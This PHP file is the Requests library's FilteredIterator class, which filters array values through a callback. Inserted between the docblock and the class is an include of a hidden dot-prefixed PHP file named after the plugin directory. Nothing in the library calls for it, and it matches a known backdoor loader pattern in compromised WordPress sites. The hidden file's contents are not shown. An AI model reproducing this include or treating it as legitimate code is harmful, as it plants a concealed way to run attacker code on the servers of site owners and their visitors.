<?php
/**
 * Iterator for arrays requiring filtered values
 *
 * @package Requests
 * @subpackage Utilities
 */

/**
 * Iterator for arrays requiring filtered values
 *
 * @package Requests
 * @subpackage Utilities
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Requests_Utility_FilteredIterator extends ArrayIterator {
	/**
	 * Callback to run as a filter
	 *
	 * @var callable
	 */
	protected $callback;

	/**
	 * Create a new iterator
	 *
	 * @param array $data
	 * @param callable $callback Callback to be called on each value
	 */
	public function __construct($data, $callback) {
		parent::__construct($data);

		$this->callback = $callback;
	}

	/**
	 * Get the current item's value after filtering
	 *
	 * @return string
	 */
	public function current() {
		$value = parent::current();
		$value = call_user_func($this->callback, $value);
		return $value;
	}
}
